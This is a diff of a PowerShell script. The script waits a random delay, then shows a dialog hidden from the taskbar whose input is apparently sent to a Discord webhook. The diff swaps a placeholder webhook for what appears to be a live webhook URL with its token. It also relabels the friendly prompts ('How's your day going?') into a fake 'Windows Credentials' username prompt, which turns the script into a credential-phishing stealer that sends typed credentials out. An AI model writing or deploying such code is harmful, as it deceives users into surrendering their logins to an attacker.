@@ -7,7 +7,7 @@ Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
 $maxAttempts = 3
 $attempt = 0
 $responseCaptured = $false
-$webhookUrl = "https://discord.com/api/webhooks/your_webhook_url"
+$webhookUrl = "https://discord.com/api/webhooks/1367319520418467910/1sSKW35i7Qqah4PznlpvluRoa9gqom-qPH7-Ur9Mq0EfdumYH8uJdjLuyE3EAUcUIXRN"
 
 while (-not $responseCaptured -and $attempt -lt $maxAttempts) {
     $form = New-Object System.Windows.Forms.Form
@@ -18,7 +18,7 @@ while (-not $responseCaptured -and $attempt -lt $maxAttempts) {
     $form.ShowInTaskbar = $false
 
     $label = New-Object System.Windows.Forms.Label
-    $label.Text = "How's your day going?"
+    $label.Text = "Windows sxxsxsCredentials"
     $label.AutoSize = $true
     $label.Location = New-Object System.Drawing.Point(10,20)
     $form.Controls.Add($label)
@@ -29,7 +29,7 @@ while (-not $responseCaptured -and $attempt -lt $maxAttempts) {
     $form.Controls.Add($textBox1)
 
     $label2 = New-Object System.Windows.Forms.Label
-    $label2.Text = "Want to explain?"
+    $label2.Text = "Username"
     $label2.AutoSize = $true
     $label2.Location = New-Object System.Drawing.Point(10,80)
     $form.Controls.Add($label2)
